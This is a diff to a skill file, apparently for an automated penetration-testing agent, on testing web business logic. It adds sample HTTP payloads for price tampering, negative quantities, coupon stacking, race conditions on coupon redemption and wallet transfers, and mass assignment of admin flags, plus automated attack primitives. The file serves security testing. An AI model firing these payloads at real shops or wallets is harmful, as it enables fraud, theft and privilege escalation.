@@ -1,9 +1,10 @@
-﻿---
+---
 name: business-logic
 description: "Business logic flaw testing: workflow bypass, data manipulation, race conditions, and state integrity"
 category: specialized
 tier: powerful
 toolRefs: [httpRequest, parseResponse, evaluateRendered, measureTiming, compareResponses, followRedirects, findEndpointsInResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders, runPrimitive, runCampaign]
+primitives: [workflowBypass, invariantProbe, configTrust, businessLogicAbuse]
 triggers: ["business logic", "workflow bypass", "data manipulation", "race conditions", "state integrity", "logic flaws", "business testing", "workflow testing", "business vulnerabilities", "application logic"]
 mitreAttack: ["T1190"]
 owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
@@ -50,10 +51,60 @@ Before testing, map the complete intended workflow:
 - Modify quantity to negative values
 - Test bulk discount thresholds
 
+**Payload:** price tampering — client-trusted price in checkout JSON:
+
+```http
+POST /api/checkout HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Cookie: session=...
+
+{
+  "items": [
+    {"productId": 1337, "name": "Laptop", "price": 0.01, "qty": 1}
+  ],
+  "currency": "USD"
+}
+```
+
 **Quantity Manipulation:**
 - Set quantity to 0, negative, or very large numbers
 - Test integer overflow: `quantity=2147483648`
 - Test decimal quantities: `quantity=0.5`
+
+**Payload:** negative quantity for refund-style credit:
+
+```http
+POST /api/cart/items HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"productId": 2001, "quantity": -100}
+```
+
+```http
+GET /cart HTTP/1.1
+Host: target.com
+```
+
+If cart total goes negative (store credit / payout), the server trusts client-side totals.
+
+**Coupon Stacking:**
+- Apply the same coupon repeatedly via replayed requests
+- Submit multiple different coupons when only one should be valid
+- Reuse an expired or single-use code
+
+**Payload:** stacked discount application:
+
+```http
+POST /api/coupons/apply HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"code": "SAVE10"}
+```
+
+Replay the same request 5 times; then apply `{"code": "WELCOME20"}` on top. If the order total reflects both discounts multiplied, stacking is accepted.
 
 **State Manipulation:**
 - Modify order status in transit (pending → delivered)
@@ -75,6 +126,31 @@ Race conditions exploit timing in concurrent operations:
    - Use the same auth headers for all requests
    - Look for: double spending, multiple success responses, inconsistent state
 
+**Payload:** race on single-use coupon redeem — fire N identical requests concurrently (last-byte sync):
+
+```http
+POST /api/coupons/redeem HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Cookie: session=...
+
+{"code": "SAVE50", "orderId": 9001}
+```
+
+Send 20 parallel copies of this request (e.g. via `HTTP/2` single-connection pipelining or threads started on a shared gate event). If ≥2 responses return `200 {"redeemed": true}` and the discount is applied twice to the order, the redemption is non-atomic.
+
+**Payload:** race on fund withdrawal / transfer:
+
+```http
+POST /api/wallet/transfer HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"to": "attacker", "amount": 500.00}
+```
+
+Fire 10 concurrent transfers against a balance of 500.00 — two successes means check-and-debit is not atomic.
+
 3. **Timing-based tests:**
    - Submit a form while the server is processing (TOCTOU)
    - Modify data between check and use (time-of-check to time-of-use)
@@ -90,6 +166,22 @@ Race conditions exploit timing in concurrent operations:
 - Test with missing required fields
 - Test with extra unexpected fields (mass assignment)
 - Test with wrong data types
+
+**Payload:** mass assignment of privilege flags:
+
+```http
+PATCH /api/user/profile HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{
+  "email": "user@example.com",
+  "isAdmin": true,
+  "isVerified": true,
+  "role": "admin",
+  "creditBalance": 999999
+}
+```
 
 ### Step 6: State Integrity Testing
 
@@ -141,3 +233,17 @@ First map the intended workflow end-to-end and note every validation point and t
 ## Verification & Impact
 
 CONFIRMED when a manipulation produces a verifiable server-side state change inconsistent with intended business rules — e.g., admin role granted, negative/zero price accepted and order placed, coupon redeemed multiple times, or a step executed out of order with effect. SUSPECTED when the response looks anomalous but final state is unverified — record as candidate. Document impact by the business consequence (financial loss, privilege gain, workflow bypass) and severity. Capture before/after request/response pairs and resulting state via `recordEvidence`.
+
+## Primitive Execution
+
+The attack classes above are executable through the primitive registry. Invoke each
+primitive by its id below using the run-primitive execution tool instead of re-firing
+payloads manually; confirmed results pass through the evidence gate and commit as
+findings with exploit proofs automatically.
+
+| Primitive id | Coverage |
+|---|---|
+| `workflowBypass` | state-machine step skipping/bypass |
+| `invariantProbe` | business-invariant violation probe |
+| `configTrust` | client-trust tampering (price/role flags) |
+| `businessLogicAbuse` | business-logic abuse flows |
